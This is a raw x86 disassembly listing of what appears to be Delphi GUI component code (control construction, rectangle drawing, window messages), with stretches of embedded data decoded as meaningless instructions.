add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
jl r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
jae r-xdata
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
add [ ecx + edx + 0x10540040 ] dl
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
inc eax
cmp [ ebx ] eax
add ecx [ esp + edx * 2 ]
inc edx
outsd
outsd
insb
popad
outsb
push edx
jae r-xdata
add [ eax ] dl
inc eax
add [ ebp + 0x39400040 ] cl
inc ebx
add [ ebx ] al
or al 0x54
inc esp
jb r-xdata
outsd
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
inc esp
imul ebp [ esi + 0x65 ] 0x55737208
jo r-xdata
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push es
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add ah cl
and [ ecx + 0x44 ] ah
jpe r-xdata
lea eax [ bx + si ]
int3
je r-xdata
add [ eax + eax * 8 - 0x4b5bffbc ] ch
inc esp
popad
je r-xdata
pushfd
cmp al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
cmp al [ ebx ]
pop es
add [ eax ] al
push ebx
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0xbffbb6c ] cl
xchg ebx eax
add [ esp + esi * 4 - 0x5437ffbc ] ah
or [ edx + 0x73 ] esi
push eax
popad
je r-xdata
mov bl 0x44
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + edi ] bh
inc ebx
add [ esi ] al
jb r-xdata
add [ esp + eax ] dh
popfd
inc esp
add [ edi + eax + 0x42 ] cl
jb r-xdata
pop ebx
inc ebx
dec esi
outsd
outsb
push es
jb r-xdata
inc esp
add [ eax + 0x4c00449d ] ah
pop es
inc edx
or [ ebp + 0x78 ] al
je r-xdata
add al cl
stosd [ edi ]
movsb [ edi ] [ esi ]
mov ah 0x44
dec esp
int3
je r-xdata
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax + 0x5b ] bl
inc ebx
add [ edi + ebp * 4 ] bh
inc esp
add [ eax ] bh
scasd [ edi ]
inc esp
add [ eax ] cl
mov al 0x44
add ah bh
xchg edx eax
inc esp
add [ eax - 0x66 ] al
inc esp
add [ ecx + ebx * 4 - 0x5d33ffbc ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] al
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ eax ] bh
mov dl 0x44
add ah dh
retn 0x44
add al 0x42
insb
jae r-xdata
pop es
dec ecx
outsb
je r-xdata
inc eax
add ah dl
cmp [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jb r-xdata
inc edx
xor al 0x4
inc ebx
sub_433ac5
xchg esp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add [ eax ] dl
inc eax
add [ ecx + eax ] ch
[ ecx + eax ]
sub_433bb4
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add al 0x0
add eax 0x74646957
push r-xdata
mov al 0x1
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or ecx [ edi + 0x6e ]
inc ebx
outsb
je r-xdata
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423994
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4241b8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423994
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4241b8
pop ebx
mov esp ebp
pop ebp
retn
jpe r-xdata
add [ edi ] al
outsd
insb
outsd
jb r-xdata
inc ebx
or al 0x89
inc ebp
hlt
in al 0x7c
inc ecx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ ebx ] dl
cmp [ ebx ] eax
test al 0x1
add bh bh
test al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
adc al [ eax ]
or edx [ edx + 0x65 ]
jae r-xdata
hlt
in al 0x7c
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070016 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] 0x8b55c08b
in al dx
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
push edx
jae r-xdata
jpe r-xdata
popad
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070015 ] al
outsb
dec ebp
outsd
jbe r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
push [ edi + edx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
insb
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
sub_433ca4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423994
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4241b8
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423994
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4241b8
pop ebx
mov esp ebp
pop ebp
retn
sub_433d68
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_423ac0
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_433ca4
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_433dc8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451a20
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x41
mov eax ebx
call sub_449774
mov edx 0x41
mov eax ebx
call sub_449798
mov dl 0x1
mov eax [ r-xdata ]
call sub_423800
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_433fc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov esi eax
mov [ ebx + 0x16c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_433fc8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_433e6c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403254
mov eax [ esi + 0x16c ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451a7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_433ea8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x160 ]
mov edx [ ebx + 0x168 ]
mov eax esi
call sub_4244a4
mov edx [ ebx + 0x16c ]
mov eax esi
call sub_4244b0
mov eax [ esi + 0x10 ]
call sub_423ab8
sar eax 0x1
jns r-xdata
mov [ esp ] eax
mov eax [ esp ]
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x10 ]
call sub_423ab8
mov edi [ ebx + 0x48 ]
sub edi eax
inc edi
mov eax [ esi + 0x10 ]
call sub_423ab8
mov ebp [ ebx + 0x4c ]
sub ebp eax
inc ebp
mov eax [ esi + 0x10 ]
call sub_423ab8
test eax eax
jne r-xdata
adc eax 0x0
cmp ebp edi
jle r-xdata
dec edi
dec ebp
mov eax ebp
mov eax edi
jmp r-xdata
sub edi eax
sar edi 0x1
jns r-xdata
sub dl 0x2
je r-xdata
mov dl [ ebx + 0x170 ]
sub dl 0x1
je r-xdata
add [ esp ] edi
sub ebp eax
sar ebp 0x1
jns r-xdata
adc edi 0x0
sub dl 0x2
jne r-xdata
add [ esp + 0x4 ] ebp
mov edi eax
mov ebp eax
adc ebp 0x0
mov dl [ ebx + 0x170 ]
sub dl 0x2
jb r-xdata
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_4241f0
jmp r-xdata
sub dl 0x2
jb r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov edx eax
test edx edx
jns r-xdata
sub dl 0x2
jb r-xdata
sar edx 0x2
push edx
push edx
mov ecx [ esp + 0x14 ]
mov eax esi
mov edx [ esp + 0x10 ]
call sub_424238
jmp r-xdata
add edx 0x3
add edi [ esp ]
push edi
add ebp [ esp + 0x8 ]
push ebp
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax esi
call sub_42406c
jmp r-xdata
sub_434004
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_451a20
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_426608
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_434448
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_403468
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_449798
mov edx 0x69
mov eax ebx
call sub_449774
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_43409c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451a7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_4340e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_426d7c
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_426d94
mov edi eax
mov eax ebx
call sub_4499bc
mov [ esp ] eax
mov eax ebx
call sub_449a00
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a30
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a30
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a30
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a30
mov esi eax
jmp r-xdata
sub_434214
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_4342c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4340e8
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_424288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4342cc
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_423a90
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_423db0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4241f0
sub_4342d4
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_461dc8
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_450adc
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_4507d8
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_44b16c
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_43436c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_4342d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_434448
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_426d7c
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_426d94
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_4340e8
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_426d7c
push eax
mov eax [ ebx + 0x168 ]
call sub_426d94
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_4342d4
test al al
je r-xdata
sub_434570
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_426d7c
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_426d7c
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_426d94
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_426d94
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_4345d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451a20
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_449774
mov edx 0x32
mov eax esi
call sub_449798
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_43467c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423994
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_419174
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_419174
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_419174
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_4241b8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_423994
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_419174
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_419174
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_419174
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_4241b8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43476c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_423994
mov ecx edi
mov edx esi
mov eax ebx
call sub_42418c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_42412c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4347ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_423ac0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423a90
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_423a74
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423994
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_423db0
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_423a90
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_423a74
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_423994
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_423db0
mov eax [ ebp - 0x4 ]
call sub_4499bc
push eax
mov eax [ ebp - 0x4 ]
call sub_449a00
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4241f0
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_43489e ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_41919c
lea eax [ ebp - 0x1c ]
call sub_43467c
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_41919c
lea eax [ ebp - 0x1c ]
call sub_43467c
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
